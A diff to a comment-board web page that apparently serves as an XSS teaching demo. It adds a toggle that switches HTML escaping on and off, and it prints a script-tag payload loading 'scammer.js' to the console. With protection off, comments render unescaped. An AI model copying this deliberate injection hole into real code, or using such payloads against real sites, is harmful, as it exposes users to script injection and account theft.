@@ -23,24 +23,97 @@
             min-height: 75rem;
             padding-top: 4.5rem;
         }
+
+        body {
+            background: #eee;
+        }
+        .lbl {
+            position: relative;
+            display: block;
+            height: 20px;
+            width: 44px;
+            background: #898989;
+            border-radius: 100px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .lbl:after {
+            position: absolute;
+            left: -2px;
+            top: -3px;
+            display: block;
+            width: 26px;
+            height: 26px;
+            border-radius: 100px;
+            background: #fff;
+            box-shadow: 0px 3px 3px rgba(0,0,0,0.05);
+            content: '';
+            transition: all 0.3s ease;
+        }
+        .lbl:active:after {
+            transform: scale(1.15, 0.85);
+        }
+        .cbx:checked ~ label {
+            background: #6fbeb5;
+        }
+        .cbx:checked ~ label:after {
+            left: 20px;
+            background: #179588;
+        }
+        .cbx:disabled ~ label {
+            background: #d5d5d5;
+            pointer-events: none;
+        }
+        .cbx:disabled ~ label:after {
+            background: #bcbdbc;
+        }
+        .cntr {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .press {
+            margin-bottom: 40px;
+        }
+        .hidden {
+            display: none;
+        }
+
     </style>
 </head>
 
 <body>
 
-<nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
-    <a class="navbar-brand" href="#">FD Society Board</a>
-    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
-        <span class="navbar-toggler-icon"></span>
-    </button>
-    <div class="collapse navbar-collapse" id="navbarCollapse">
-        <form class="form-inline mt-2 mt-md-0 ">
-            <a class="btn btn-outline-success my-2 my-sm-0" href="index.html">Logout</a>
-        </form>
+<nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark container">
+    <div class="row">
+        <div class="col">
+            <a class="navbar-brand" href="#">FD Society Board</a>
+        </div>
+        <div class="col">
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+        <div class="col">
+            <p class="navbar-brand">Enable XSS Protection</p>
+        </div>
+        <div class="col" style="padding-top: 10px">
+            <input type="checkbox" id="toggle" class="cbx hidden"/>
+            <label for="toggle" class="lbl"></label>
+        </div>
+        <div class="col-md-2 offset-md-5">
+            <div class="collapse  navbar-collapse" id="navbarCollapse">
+                <form class="form-inline mt-2 mt-md-0 ">
+                    <a class="btn btn-outline-success my-2 my-sm-0" href="index.html">Logout</a>
+                </form>
+            </div>
+        </div>
     </div>
 </nav>
 
-<div class="container">
+<div class="container" style="margin-top: 50px">
+
 
         <div class="card">
             <div class="card-body">
@@ -77,19 +150,20 @@
     var template = `
         <div class="card">
           <div class="card-body">
-            <h4 class="card-title">Comment</h4>
+            <h4 class="card-title">Comment#\${this.id}</h4>
             <h6 class="card-subtitle mb-2 text-muted">\${this.username}</h6>
             <p class="card-text">\${this.comment}</p>
-            <a href="#" class="card-link">Like</a>
-            <a href="#" class="card-link">Share</a>
+            <button type="button" onclick="deleteComment(\${this.id})" class="btn btn-primary btn-sm">Delete</button>
           </div>
         </div>
         <br>
     `;
 
-    let token = window.localStorage.getItem("authKey");
-    let username = window.localStorage.getItem("username");
+    let authData = JSON.parse(window.localStorage.getItem("authData"));
+
     const server = "https://snickdx.me:3001";
+
+    console.log('XSS CODE: <script src="https://snickdx.me/xss/scammer.js"><\/script>');
 
 //    if(token === null)window.location.href ="index.html";
 
@@ -106,9 +180,51 @@
 
     loadData();
 
+    var entityMap = {
+	    '&': '&amp;',
+	    '<': '&lt;',
+	    '>': '&gt;',
+	    '"': '&quot;',
+	    "'": '&#39;',
+	    '/': '&#x2F;',
+	    '`': '&#x60;',
+	    '=': '&#x3D;'
+    };
+
+    function escapeHtml (string) {
+	    let sanitized = String(string).replace(/[&<>"'`=\/]/g, function (s) {
+		    return entityMap[s];
+	    });
+	    console.log("Comment: ", string, " Sanitized to: ", sanitized);
+	    return sanitized;
+
+    }
+
+    function deleteComment(id){
+	    let settings = {
+		    "async": true,
+		    "crossDomain": true,
+		    "url": "https://snickdx.me:3001/comments/"+id,
+		    "method": "DELETE",
+		    "headers": {
+			    "cache-control": "no-cache"
+		    }
+	    };
+
+	    $.ajax(settings).done(function (response) {
+		    console.log(response);
+		    loadData();
+	    });
+
+
+    }
+
+    let protection = false;
 
 
     $("#commentBtn").click(function(){
+    	let comment = protection ? escapeHtml($("#comment").val()) : $("#comment").val();
+
 	    $.ajax(
 		    {
 			    "async": true,
@@ -120,15 +236,21 @@
 				    "cache-control": "no-cache"
 			    },
 			    "processData": false,
-			    data: JSON.stringify({ username: window.localStorage.getItem("username"), comment: $("#comment").val()})
+			    data: JSON.stringify({ username: authData.username, comment: comment})
 		    })
 		    .done(function( msg ) {
-			    loadData();
 			    $("#comment").val('');
+			    loadData();
 
 		    }).fail(function(msg){
 	    });
-    })
+    });
+
+
+    $("#toggle").click(function(){
+    	protection = !protection;
+    	console.log("XSS Protection ",protection);
+    });
 
 </script>
 
